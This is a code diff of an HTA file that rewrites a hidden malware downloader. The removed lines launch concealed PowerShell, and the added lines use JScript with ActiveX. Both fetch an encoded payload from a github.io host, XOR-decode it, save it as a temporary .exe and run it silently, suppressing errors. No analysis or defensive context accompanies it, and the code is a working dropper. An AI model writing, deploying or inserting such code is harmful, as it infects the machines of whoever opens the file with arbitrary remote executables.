@@ -1,10 +1,38 @@
 <html>
 <head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
 <hta:application id="o" applicationname="d" border="none" caption="no" showintaskbar="no" windowstate="minimize" />
-</head>
-<body>
-<script language="VBScript">
-CreateObject("WScript.Shell").Run "powershell -NoP -NonI -W Hidden -Exec Bypass -C ""$tmp=$env:TEMP+'\'+(New-Object Random).Next(100000,999999).ToString()+'.exe';$wc=New-Object Net.WebClient;$d=$wc.DownloadData('https://kai195102.github.io/d/c2d.enc');$k=58,151,121,176;for($i=0;$i-lt$d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%4]};[io.file]::WriteAllBytes($tmp,$d);Start-Process $tmp""", 0, False
+<script language="JScript">
+function b64dec(s) {
+  var c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+  var r = "";
+  for (var i = 0; i < s.length; i += 4) {
+    var a = c.indexOf(s[i]), b = c.indexOf(s[i+1]), d = c.indexOf(s[i+2]), e = c.indexOf(s[i+3]);
+    r += String.fromCharCode((a << 2) | (b >> 4));
+    if (d >= 0) r += String.fromCharCode(((b & 15) << 4) | (d >> 2));
+    if (e >= 0) r += String.fromCharCode(((d & 3) << 6) | e);
+  }
+  return r;
+}
+try {
+  var x = new ActiveXObject("MSXML2.XMLHTTP.6.0");
+  x.Open("GET", "https://kai195102.github.io/d/c2d.b64", false);
+  x.Send();
+  var b64 = x.ResponseText;
+  var dec = b64dec(b64);
+  var key = [0x3A, 0x97, 0x79, 0xB0];
+  var out = "";
+  for (var i = 0; i < dec.length; i++) out += String.fromCharCode(dec.charCodeAt(i) ^ key[i % 4]);
+  var fso = new ActiveXObject("Scripting.FileSystemObject");
+  var tmp = fso.GetSpecialFolder(2) + "\\" + fso.GetTempName() + ".exe";
+  var st = new ActiveXObject("ADODB.Stream");
+  st.Type = 2; st.Charset = "iso-8859-1"; st.Open();
+  st.WriteText(out);
+  st.SaveToFile(tmp, 2);
+  st.Close();
+  new ActiveXObject("WScript.Shell").Run(tmp, 0, false);
+} catch (e) {}
 </script>
-</body>
+</head>
+<body></body>
 </html>
